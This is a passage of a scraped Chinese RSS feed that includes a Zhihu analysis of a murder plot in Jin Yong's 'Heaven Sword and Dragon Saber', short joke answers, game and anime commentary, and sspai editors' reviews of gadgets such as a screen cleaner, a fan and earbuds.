alt=\"\"><figcaption>祝绪丹版周芷若</figcaption></figure><p>至于为何不嫁祸谢逊，那是因为：第一，周芷若当时并不知道金毛狮王偶尔会发狂；第二，周芷若给所有人都下了十香软筋散，狮王本人也中了毒；第三，周芷若本人还出于嫉妒和嫁祸于人的目的，把蛛儿的脸划伤了，从这点来看，赵敏嫌疑最大，因为曾经赵敏在万安寺也是预备毁周芷若容的。而谢逊如果发了疯，何至于毁了蛛儿容貌，这点在逻辑上难以自洽。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-d0e96557f9e5ea07ce039030059b4973_720w.jpg?source=8673f162\" alt=\"\"><figcaption>高圆圆版周芷若</figcaption></figure><p>所以我想，你想问的是“为何周芷若没有手刃赵敏或者把她捂死、掐死，而是要让她被海水淹死”。这是因为周芷若什么都想要：一来她要报杀师之仇，赵敏对灭绝师太的死确实是有很大的责任；二来她想要婚姻，杀了正妻蛛儿后一定要有个嫁祸的对象；三来她想要张无忌的爱情，那么赵敏一定要带着满身污点去死。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-d274e0f9c83c9b0c36513e912c11dfc1_720w.jpg?source=8673f162\" alt=\"\"><figcaption>张敏版赵敏，搭档是黎姿，黎姿目前是唯一个既演过周芷若又演过赵敏的演员，但这个版本的周芷若其实是周芷若 + 朱九真。</figcaption></figure><p>四来倚天屠龙的秘密只有她知道，而赵敏持有倚天剑，又是朝廷的人，自然应该嫁祸赵敏；五来当时岛上只有他们 5 个人，谢逊和张无忌情同父子，正房蛛儿又病入膏肓，那么最适合嫁祸的那当然是赵敏了，而且赵敏本人太聪明了，只要赵敏没死，那么她一定会输。概言之，在周芷若的计划里，赵敏必须是背锅侠，也必死无疑，还要死得其法。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-a0034e2d0b171b2602130d160fa55704_720w.jpg?source=8673f162\" alt=\"\"><figcaption>陈钰琪版赵敏</figcaption></figure><p>那么为何不能把赵敏掐死、闷死，或者砍死呢？那是因为若趁赵敏昏迷掐死或者闷死她，然后扔进海里喂鱼，貌似是安全了。可如果一旦海浪把赵敏尸体带回来，张无忌很容易就会发现赵敏在落水之前就死了，因为如果是淹死的，肺里面不可能没有水，肺里没水就说明赵敏一定是被弄死了再扔海里的。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-0002cb110de413b3d576dabaf4adff24_720w.jpg?source=8673f162\" alt=\"\"><figcaption>贾静雯版赵敏</figcaption></figure><p>砍死赵敏后再扔水里也同理。问题关键在于周芷若要让张无忌恨赵敏，那她就要“制造”出一个无比阴毒的赵敏，让众人觉得是赵敏意图下毒夺刀杀人。如果赵敏尸体被海浪冲回来，她倒是可以推说赵敏是因为遇到波斯船队被砍杀而死。但只要找到波斯人对峙，谎言就会被戳穿，同时因为她想要张无忌的爱情，她需要维持一种楚楚动人、无依无靠的人设，所以她不能冒这个险。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-cab387b33228430f2d4dd2cff1fabc0b_720w.jpg?source=8673f162\" alt=\"\"><figcaption>黎姿版赵敏</figcaption></figure><p>所以，对于当时啥都想要的周芷若来说，最万无一失的万全之策就是直接让吃了十香软筋散的赵敏沉入大海。那时候，由于死人不会说话，即使赵敏的尸体被海浪冲上了岸，所有人也都只会觉得赵敏是“自作孽不可活”，那时候周芷若想要的婚姻、爱情、掌门人、教主夫人，还有武功艳压群雄、找到完美替死鬼、为师父报仇等目标都可以实现了。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-d783895f2d58c70568de766929845e37_720w.jpg?source=8673f162\" alt=\"\"><figcaption>佘诗曼版周芷若</figcaption></figure><p>当然后来周芷若千算万算也没想到：孤岛上忙活了一通下来，蛛儿没死、赵敏被救起，谢逊也知道了孤岛事件的真相，自己机关算尽、寻死觅活、一哭二闹三上吊谋来的姻缘，就这么成了笑话。也可以说是人算不如天算，苍天有眼了。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-d00964b359e2a18b325d64db42d1326c_720w.jpg?source=8673f162\" alt=\"\"><figcaption>叶童版赵敏和周海媚版周芷若</figcaption></figure>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/457353518\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737666"},{"title":"瞎扯 · 如何正确地吐槽","date":"2021-07-01 23:06:29","description":"\n<div>\n<h2>为什么有些人认为“不要跟律师谈恋爱”？</h2>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/48e875a05688500e8f3d4183d1769e41_l.jpg?source=8673f162\"><span>刘泽枫，</span><span>谈笑怼鸿儒，往来干白丁。懂王刘大律师v：zefeng03</span>\n<a href=\"https://www.zhihu.com/question/335189221/answer/774096880\" hidden>阅读原文</a>\n</div>\n<div>\n<p>因为谈恋爱没有法律效力，一般都是建议跟律师结婚</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/335189221\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>南方人在北方生活，有哪些搞笑的事？</h2>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/da8e974dc_l.jpg?source=8673f162\"><span>知乎用户，</span><span>泥萌能不能自己独立完成作业？</span>\n<a href=\"https://www.zhihu.com/question/307236773/answer/588194110\" hidden>阅读原文</a>\n</div>\n<div>\n<p>讲个<b>笑话</b>吧。黑龙江这里，入冬之后，人们说气温的时候是不加“零下”俩字的，默认就是零下。有一年冬天，一个广东老板，第一次来哈尔滨玩，晚上下飞机直接坐车到酒店，没觉得冷。第二天早上问大厅前台，今天气温多少呀。前台说，22度。老板穿个短袖就出去了……</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/307236773\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>你爸妈刚用支付宝时闹出过什么笑话吗？</h2>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/da8e974dc_l.jpg?source=8673f162\"><span>知乎用户，</span><span>家庭煮夫</span>\n<a href=\"https://www.zhihu.com/question/316939429/answer/632664853\" hidden>阅读原文</a>\n</div>\n<div>\n<p>我来说一个，我妈刚学会蚂蚁森林的时候，每天早上定时给我扔大便，定时，定点，每天，我一开始以为这是她俏皮的跟我打招呼的方式，直到春节回老家提起，她说，难道扔大便不是在给我的树施肥吗？她一直以为我的树是她扔大便施肥长大的！</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/316939429\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>如何用一张图证明你看过《权力的游戏》？</h2>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/da8e974dc_l.jpg?source=8673f162\"><span>知乎用户</span>\n<a href=\"https://www.zhihu.com/question/319483049/answer/650060681\" hidden>阅读原文</a>\n</div>\n<div>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-c7514b00ab2c32a5667976d6826d60e4_720w.jpg?source=8673f162\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"3020\" data-default-watermark-src=\"https://pic4.zhimg.com/v2-954ae59c9604b0d15f1f1f0131e5ac38_720w.jpg?source=8673f162\" width=\"720\" data-original=\"https://pic4.zhimg.com/v2-c7514b00ab2c32a5667976d6826d60e4_720w.jpg?source=8673f162\"></figure>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/319483049\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>被男生强吻是一种什么样的体验？</h2>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-a6ba18a63d8e340bf1a6b590d4e92fe5_l.jpg?source=8673f162\"><span>铁拳森林，</span><span>出口贸易行业里最沙雕的男人</span>\n<a href=\"https://www.zhihu.com/question/35282070/answer/743541676\" hidden>阅读原文</a>\n</div>\n<div>\n<p>我以为我这么帅她不会报警</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-367f9fff83b96ffbeef2decbac1ab77d_720w.jpg?source=8673f162\" alt=\"\"></figure>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/35282070\">阅读原文<span></span></a></div>\n</div>\n","link":"https://daily.zhihu.com/story/9737670"},{"title":"如何评价《明日方舟》新六星卡涅利安？","date":"2021-07-01 15:30:08","description":"\n<p>粗略地做了个卡涅利安的评测视频。她的定位是环法，常态高防，不开技能可以用作嘲讽吸引伤害，开技能时也有极高的DPS，清场秒人两不误。而且谁能拒绝埃及风小姐姐呢（</p>\n<hr>\n<p>第二个评测视频出来了，6人H7-4卡姐伤害测试，有兴趣可以移步观看</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/virunce?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Yuro</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/461539120/answer/1920212609?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">67 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/467680402?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">明日方舟新人求指点？</a><br><a href=\"http://www.zhihu.com/question/467041726?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">明日方舟保底抽到个陈，我哭了，陈现在是不是太弱了？（我有煌和银灰了）？</a><br>\n","link":"http://www.zhihu.com/question/461539120/answer/1920212609?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价《画江湖之不良人》第四季第十二集？","date":"2021-07-01 11:30:07","description":"\n<p>终于快迎来结局了，其实最后一集片子的音效我现在还没完全通过，今天少说点，得赶紧去工作啦。下周最后一更多写，写一堆。</p>\n<p><br></p>\n<p>先感谢赵梦娇小姐姐<i>（蚩梦/鲜参 CV）</i>。</p>\n<p><br></p>\n<p>《花腰带》这首歌早先其实并没有安排两个版本，她唱的版本是后来加的。原因是这首歌成品出来后，我总觉的鲜参年轻的时候一开口是原生态腔有点儿奇怪，因此才有的《花腰带》CV版。</p>\n<p><br></p>\n<p><b>这首歌是没有报酬的，咱娇姐送的！</b>当然饭是管的，我记得录完歌请她吃了顿火锅……</p>\n<p>发布的歌曲中是没有最后一段弦乐的，是因当时做片子时我觉得空所以后加的。</p>\n<a href=\"https://www.zhihu.com/zvideo/1393924776298246144\">12集草配</a><p><i>（很早以前拍摄的，请忽略我给鲜参草配的台词。制作镜头时没有最后的这段弦乐，我只能一边剪辑一边嘴配，贼逗。最后出片子前再交给毛亮老师按我嘴配的加了这部分。其实有时候剪烦躁了，连音效我都嘴配……叮咣咚唰的。这里顺便给自己邀个功，不良人4是我配音的处女作，哈哈哈！基本上旧部打斗那些喊叫奸笑都是我跟镜头导演任伟杰配的，第五季的导演也被我拉过来配过群杂角色——不过群杂里的男一，绝对是我！）</i></p>\n<p>本集略有些伤感，李偘、李星云他们也做了该做的事——正所谓，我不入地狱，谁入地狱。蚩离、鲜参也完成了他们这一辈人该做的事，弥补了当年犯下的错误。本季最终结局下周就要来了，我这里关于剧情也不多讲了，每个人看剧时都会有不同的感受，其实就我个人而言我倒是没有觉得很虐，但杨磊大大就觉得虐，还发了微博强调这个事。。。。。总之，喜欢看的小伙伴们就请继续看吧。</p>\n<p>下周主要说一下蚩梦的情感线，以及这个人物的由来等，包括尤川的问题，会一并聊。</p>\n<p>最后，百年荣光，普天同庆。</p>\n<p>但任重而道远，吾辈当自强，祝祖国繁荣昌盛 ！ </p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/cheng-zi-duo-62?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">橙子多</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/467933480/answer/1972409154?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">113 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/464286335?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何看待《画江湖之不良人》第四季第10集？</a><br><a href=\"http://www.zhihu.com/question/462893407?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价《画江湖之不良人》第四季第9集？</a><br>\n","link":"http://www.zhihu.com/question/467933480/answer/1972409154?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"新玩意 069｜少数派的编辑们最近买了啥？","date":"2021-07-01 09:28:48","description":"\n<h4>关于栏目</h4>\n<p>很多读者都会好奇少数派的编辑们到底平时都「买了啥」。我们希望通过「编辑部的新玩意」介绍编辑部成员们最近在用的新奇产品，让他们自己来谈谈这些新玩意的使用体验究竟如何。</p>\n<hr>\n<h2>@广陵止息: WHOOSH! Screen Shine Pro</h2>\n<ul>\n<li>入手渠道：朋友代购</li>\n<li>价格：120 元</li>\n</ul>\n<p>「如何正确清理屏幕」这个问题从很早以前开始就一直困惑着我。一方面是屏幕涂层不能乱擦，还记得以前不懂事的时候直接把 RMBP 的屏幕涂层给擦花了的情况，所以后来屏幕清洁时基本就对照了 Apple <a href=\"https://support.apple.com/zh-cn/guide/mac-help/mchlp2657/mac\">官方建议</a> 了；另一方面，就是每次用清水和无纺布擦完以后，总感觉屏幕擦得并不够干净，实际上是擦干净了只是不够亮而已。</p>\n<p>直到某次我某次很晚路过 Apple Store，发现里面的店员用一种没见过的带有橙色喷嘴的喷雾喷到布上，然后去擦沾满指纹的 iPad 屏幕，瞬间那个 iPad 的屏幕变得又干净又亮，这个清洁效果让我惊为天人。疯狂私聊对 Apple 有深入了解的死党，了解到 Apple 御用的清洁剂有三种，分别是 iKlear、Clens 以及 WHOOSH!，其中我见到的应该是 WHOOSH!。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/78cb7943ee754cc1e68a15e493e07cd2\"><figcaption>图源：WHOOSH! 官网</figcaption></figure><p>自从了解到这个品牌以后就一直心心念念想要买一瓶，奈何国内真的是没有代理，外加疫情影响严重香港可以代购的朋友也一直没机会回来。好不容易等到他回来都已经到了今年 6 月份了，加上隔离和快递最后终于到我手里了。WHOOSH! Screen Shine Pro 内不仅有一整瓶的清洁喷液，还附赠了两块超细纤维擦拭布，其中一块是将清洁液喷在上面以后再擦拭屏幕的（切记不可以直接将清洁液直接喷到屏幕上，可能会流入显示器内部），另一块则是用于擦干屏幕上残留的清洁剂并抛光的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/9ba4b0ced3cb5d2440edec3b55f4030d.png\"><figcaption>对比图，左：清洁前，右：清洁后</figcaption></figure><p>WHOOSH! 清洁效果也确实好，可以对比上图 iPad 擦前和擦过后的效果。这种清洁液没有任何气味，挥发速度也不算快，所以有充分的机会可以把屏幕上的各种痕迹给擦干净，还可以快速方便地把屏幕<strong>抛光</strong>，仿佛刚刚到手一般。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/6ce514326ca2ee197f28a5fedbfe12a5\"><figcaption>图源：WHOOSH! 官网</figcaption></figure><p>另外就是 WHOOSH! 不仅可以用于擦各种不同尺寸大小的屏幕，还可以用来擦各种设备的外壳甚至是眼镜和镜头这样的东西，也算是一站式的解决方案了。最后，后排提醒：使用任何清洁剂擦拭屏幕之前一定要保证屏幕已经冷却到了室温，否则可能在屏幕上永久残留清洁液的痕迹。</p>\n<h2>@北鸮：全胜 G-4 麦克风隔音屏</h2>\n<ul>\n<li>入手渠道：淘宝自购</li>\n<li>价格：折后 322 元</li>\n</ul>\n<p>我目前住着的房子基本算是……半成品，没进什么家具，也没搬太多的东西，差不多就是刚刚好保证起居。单说住的话倒是没什么问题（如果不考虑最近修电路的破事儿），就是家具太少，导致屋子的回音非常重，是那种能把我混成 Enya 的程度。我有一个 USB 麦克风，平常就往桌上一架那么用。飞书做了降噪，开会的时候问题不是很大，倒是和我一起开黑打游戏的朋友基本都要把我拉黑了。用他们的话说，我差不多是在阶梯教室里朝坐在最后一排的他们喊集火，有一种大学上课睡着被教授用粉笔射击的恐惧。</p>\n<p>真正给我带来困扰的有两件事：一是我下班之后偶尔自嗨唱唱歌，录出来的声音一片糊；二是前几天我给 <a href=\"https://sspai.com/post/67175\">这篇文章</a> 的视频配了音，挨石听完就跟我说，我屋子的房混太重了，最好的那一版都很糊。我怎么试都调整不出干净的声音，最后只能拯救了一版上去用，实际效果……<a href=\"https://www.bilibili.com/video/BV1k44y167Q7/\">不甚理想</a>。</p>\n<p>于是，趁着 618 搞活动凑满减，我买了一个曾经在一位 UP 主的视频里见过的，可以暂时解决一部分问题的玩意儿——</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/7eeec88184b4e1d5d7f9de7558e081ca.png\"></figure><p>按照商家的说法，这个玩意儿叫麦克风隔音屏，理论上要在已经装好的录音棚里才能更好发挥作用。对于我这种要求不高的人来说，单纯有这样一个设备已经能解决不少问题了。虽然唱歌这样大音量的任务上它的作用比较有限，但如果是普通音量的交流、录制旁白等活动，这个降噪板吸收声波的成效可以说十分显著。我 <a href=\"https://www.bilibili.com/audio/au2389802\">录了一小段前后对比</a>，不考虑嗓子状态的差别，在房间摆设状态不变，只是增加了降噪板，后期仅降噪的情况下，我用同样音量念白的语句听起来就清晰了不少。</p>\n<p>要说缺点的话，这麦克风我平常就只能架在这里当成唱歌和录东西专用的麦了，我实在懒得把它卸下来架回桌上，它要是没有这么大占地面积就完美了。</p>\n<h2>@Microhoo：智米风扇 3</h2>\n<ul>\n<li>购入渠道：天猫旗舰店</li>\n<li>购入价格：549 元</li>\n</ul>\n<p>贵州夏天大部分时候的温度普遍稳定在 25～28℃ 左右，考虑到成本和舒适度，风扇比空调的需求会更多一些。其实本来是想要狠狠心买巴慕达的，但因为 6.18 买了太多东西以致于家道中落所以只能消费降级买小米系的产品——而我其实对小米系的不关乎安全性且千元以下品类有很不错的好感度。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/d4742003bc9e6c0be291d8709e88e1aa.jpeg\"></figure><p>再往前几年其实很难想象落地风扇能和「移动性」混为一谈，我也是在之前看 cbvivi 的某个视频时看到他说使用电池版巴慕达的惊人体验才开始对这个品牌种草，所以即便是买不了巴慕达，「带电池」也是我选购替代品的基本原则之一。</p>\n<p>智米风扇 3 的电池续航官方标称是 20h，但我想很多人包括我都不会注意到它详情页最下方的小字——1 档风速下——而我开到最高 100 档使用的续航大概是 6 小时左右，倒是也能应付室内使用的大部分场景，例如吃饭或者阳台发呆，即便是抬到卧室，通常你也不会设定到这么高档在睡觉时吹，所以风吹一整宿也绰绰有余。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/3ce7fd0e824172f2592dea3b71502b52.jpeg\"></figure><p>巴慕达备受推崇的主要原因是它专利的自然风系统，当然我没有体验过所以不妄加褒贬，但智米也有一个所谓的「模拟自然风」，相比前者从扇叶结构获益，智米是用所谓大数据和算法调整转速实现。使用之前因为断章取义我以为它只是会自动控制风速在一个合适的值而已所以也没有过多期待，但真正吹上的时候我是非常想站起来鼓掌的。</p>\n<p>开启自然风模式后，你的实际体感真的很像是在户外吹自然风，也就是说它的风速是随时变化的，内心平静一点甚至能在脑海里模拟出「波浪涟漪」的感觉。当然只描述体感你肯定觉得没啥鬼用，但它解决了一个风扇的巨大历史问题——不能死盯着人吹。用过传统风扇的你肯定体验过不对着吹和没开一样，对着又受不了，摇头模式里一下一下的喷射过来又心里痒，但自然风模式下就不一样了，即便是固定对着你吹，也只是会让你感到凉快和舒适——不过这只适用于「略热」的场景，如果是类似广东那种动辄三十几四十度的夏天，这个模式估计又会太不痛不痒。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/45cbaf12b8217021b8b004ada25370bb.jpeg\"></figure><p>既然是小米系，那么一定可以联网。落地风扇通常会与使用者保持一定距离使用，所以要么坐下了才想起来开或者出门了突然惊觉好像没关风扇是常有的事儿，在米家 app 中绑定风扇后不仅可以便捷的开关和设定功能，还能定时，非常灵活称心如意。如果家里有老人，它其实还配套了一个小小的蓝牙遥控器，但只能简单的启闭和调整风速模式。</p>\n<p>反正，它已经我走哪跟哪了。</p>\n<h2>@揽件阿平：飞智银狐 T1 耳机</h2>\n<ul>\n<li>入手渠道：<a href=\"https://item.taobao.com/item.htm?spm=a1z10.3-c-s.w4002-22968806714.10.15dc61f0J5Q8hu&amp;id=650129707761\">少数派商店</a>\n</li>\n<li>价格：折后 289 元</li>\n</ul>\n<p>我最近又开始玩和平精英手游了，想着再弄个专门玩游戏的真无线耳机。</p>\n<p>在问路的推荐下，我入手了飞智这款。这个品牌是做手游半截手柄起家，几年前我就用过他们家手柄，做工和手感都不错。但他们做的耳机怎么样说实话我一开始没有抱什么期望，用了两个星期发现，作为一款两百多的真无线游戏耳机，它竟然还不错。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/d80ae32e1bf6791a014f820a2e0e4b28.jpeg\"></figure><p>最戳我痛点的是它的「轻」。耳机盒加上耳塞只有 48g，这个重量比我的 AirPods Pro 还要轻几克。</p>\n<p>耳塞更轻的好处，是能提升长时间佩戴的舒适度，尤其是对于随便就是一两小时的玩游戏来说。我最近经常玩完游戏好一会儿才想起耳机忘了摘，就因为它戴起来够轻，加上舒适度也 OK，总是「无感」到让我忘了它的存在。</p>\n<p>至于更轻的耳机盒，大大方便我带出门，我平时出门就背一个单肩小包或者干脆塞裤子口袋，所以我带的东西一定得尽可能少和轻，这种轻的耳机盒太适合我。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/c2117c5edc8d02b8e204da99cbff9834.jpeg\"></figure><p>这款耳机的耳塞类似 AirPods Pro，属于浅入耳式，对于不习惯侵入更深的入耳式耳塞的人来说，佩戴感受非常友好。不过相对的，浅入耳式的隔音就会稍微差一点，如果是在外面比如嘈杂的商场排号等位时玩游戏，用这个耳机就需要调大一点音量才行了，毕竟它没有主动降噪。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/fcfb5bc6b382d7686ab4b3194371f805\"></figure><p>用它打游戏的声音表现也还不错，毕竟是针对手游专门做的声音调教，脚步声很清晰，听不同方位的脚步也没问题，这对我来说就很足够了。</p>\n<p>另外，飞智这款耳机使用的是蓝牙 5.0，他们宣称使用的是自研的名为 Foxspeed 技术，无论在苹果或安卓手机上都能保持 60ms 的低延迟。这个低延迟模式在使用过程中，需要手动敲三下右耳塞来开启。我现在一般是用 OPPO 来玩游戏，两周用下来，延迟和信号表现都挺稳的，没遇到过连接不稳定的情况。</p>\n<p>这款耳机的外观唯一差点意思的地方是，它的塑料材质初上手的观感会显得廉价，但摸起来触感不错，干爽不粘指纹，和我黏手的一加 9 Pro 闪银后盖形式鲜明对比。</p>\n<p>耳机续航标称是耳机 4 小时 + 耳机盒 20 小时，我实际用起来没啥感觉，日常很够用。</p>\n<p>作为一款两百出头的真无线游戏耳机，这耳机性价比挺不错的，成本都花在了刀刃上，玩游戏和佩戴的体验很稳，外观质感略弱一点。像我这样平时 iPhone 听歌有 AirPods Pro，再买这样一个耳机在安卓上玩游戏，蛮爽的。</p>\n<h2>@zachary：JBL CLIP4</h2>\n<ul>\n<li>购买渠道：JBL 海外旗舰店</li>\n<li>参考价格：¥374（品牌首单优惠）</li>\n</ul>\n<p>去年年底的时候，突然对露营产生了着迷。经常幻想自己能够沿着海边驱车，手机开着地图循着一条条无名路前进，走到一个合适的平地就停下来支起帐篷，架设好折叠椅、茶几和炊具，打开音响播放林家谦的歌，然后坐下来静静望着风景思考人生。</p>\n<p>如今半年过去了，以上提到的种种露营设备全部未购，只有音响有了着落。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/22/a39131e662249cf40ee8595fb85344d6.jpg\"></figure><p>其实除了露营，还有许多场景让我产生了渴望入手一款便携式音响的想法。比如说爬山的时候、徒步的时候、在大型景区游览的时候；总而言之，只要是需要长时间步行的过程，能够有音乐的陪伴总是乐事一件。当然开手机功放也不是不行，就是有点土吧。</p>\n<p>我原本以为自己的需求容易实现：在满足音质要求的情况下，要够小、够便携，最好是有卡扣能够夹背包上，这样我就可以腾出手来拍摄；另外还得足够价格也得亲民，否则如果用到能够买一款旗舰级音响的价格来购置，实在没有必要。但是后来发现满足需求的并不多。</p>\n<p>筛选了一遍过后，JBL CLIP4 是最终入手的产品。其重量与华为 Mate 40 RS 保时捷版差不多，只有 239g；防水等级 IP67，就算在户外遭遇降雨，或者放在泳池边也无需担心；蓝牙版本升级到 v5.1，意味着覆盖范围更广功耗更低，续航达到了 10 小时；充电接口也升级到了  Type-C，充电速度更快，这点的确很新鲜，或许在今后发布的音响设备中会更加普遍。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/22/article/096a4c6a66e34c9a00ff7e66f343b875\"></figure><p>更吸引我的是，相比于它的上一代产品 CLIP3，CLIP4 提供了多达 10 种颜色选择，深谙苹果的营销之道。不过产品造型从圆形变为了椭圆形，好看与否就见仁见智了，我个人认为都能接受，至少颜值比起更为常见的「JBL GO3 音乐金砖」（我也不知道为什么，很多商家活动都喜欢送这款音响）要高出不止半点。表面材质依然采用织物包裹，这也是他们家的惯用设计了。</p>\n<p>说到可能是最让人关注的音质问题。因为个人也不是玩家，可能说不出个所以然，凭感觉描述的话，低频清脆高频依然带感，无论是播放什么类型的音乐都没有明显的杂音。根据<a href=\"https://detail.tmall.hk/hk/item.htm?tbpm=2&amp;spm=a1z09.2.0.0.3ecc2e8dxQSgcZ&amp;id=638041835161&amp;sku_properties=5919063:6536025\">官方描述</a>，CLIP4 采用了 JBL PRO SOUND 特色音效，信噪比 &gt;85dB，作为一款编写的户外音响来说我认为相当满意。�「万元以下听个响」的玩家们仅供参考。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/22/ee6b72cb24ac4c63f55ea8557b183467.jpg\"><figcaption>唯一的迷彩色，超喜欢嘿嘿~</figcaption></figure><p>其实 CLIP4 我在今年2月份就入手了，直到五一期间才认真地把它带到黄果树瀑布使用了一番（是的，然后拖到现在才写），真的给旅途增添了不少乐趣~</p>\n<h2>@黎明前线Alan：Bestand 妙控键盘/妙控板二合一支架 </h2>\n<ul>\n<li>入手渠道：淘宝</li>\n<li>参考价格：¥79（原价 ¥154）</li>\n</ul>\n<p>虽然从年初自己的工作主力机就已经由 PC 变成了 Mac，但直到最近才下定决心给自己的妙控键盘添置一块妙控板，但由于桌面较小同时设备较多，便想到了在 ins 上有看到一些博主选择了整体式框架来将妙控键盘+妙控板合二为一进行收纳移动。</p>\n<p>由于这可能是一个比较小众的需求：所以我直到打开淘宝才意识到根本不知道这种东西应该用什么关键字搜索，但后来在多次关键字搜索尝试之后，还是找到了这一款 Bestand 出品的妙控键盘/妙控板二合一支架。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/24/article/28e4a25a9ff210809194eddba20eb6e9\"></figure><p>由于桌面并不是很大，而且桌面除了摆放键盘之外平时很多时候还需要腾地方给各种文件，有了这个二合一框架之后，移动妙控键盘与妙控板这一对组合就方便了不少，而且支架本身四角以及边缘都有一层塑料包裹，实际上起到了一个保护壳的效果，在桌面上移动时还能避免各种设备磕碰给妙控组合的铝合金边框造成划伤。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/05/24/article/7912bce7e4bc85e289dbf746910dd5f4\"></figure><p>除了二合一的功能之前，这款支架底部还覆盖了大面积的防滑垫，但在鼠标垫上防滑效果相比妙控键盘/妙控板自带的四角防滑垫效果其实区别不大，另一个我未曾预料到的功能是：这款支架还会将妙控键盘与妙控板整体抬高近 1cm（毕竟是支架嘛），同时也增大了倾角，我实际使用中明显感受到这个角度有比原本的键盘姿态更加舒适，输入效率也有一点提高，算是意料之外的优点。</p>\n<p>除了上述之外，由于这本身只是一个塑料支架，所以拿起时在妙控键盘与妙控板的连接处总有一点松动的感觉；而且就一个塑料支架来讲，原价毫无疑问是虚高的，但好在拿到手实际质感并不算太差，倒也算是对得起（打折后的）价格了。</p>\n<p>PS：从拿到手的包装来看，这款产品很可能是主要面向海外市场销售。</p>\n<p>PPS：虽然妙控键盘/妙控板都有黑色款，但这款支架似乎并没有对应的黑色版本在售，而且设计上也对习惯把妙控板摆在左边的左撇子用户不是那么友好，所以购买时或许也要多加考量自己的实际使用需求。</p>\n<h2>@橙子虾：迪卡侬防晒风衣</h2>\n<ul>\n<li>入手渠道：迪卡侬线下门店</li>\n<li>入手价格：179元 × 2件</li>\n</ul>\n<p>当前南宁青秀区室外的气温为 35°C，加上有「绿城」称号的独特环境，使得南宁的酷热感格外剧烈。</p>\n<p>这是我购买防晒风衣的客观因素，主观因素是在工作上增加了户外走动的部分，从办公室行走至正在装修的新门店需要 8 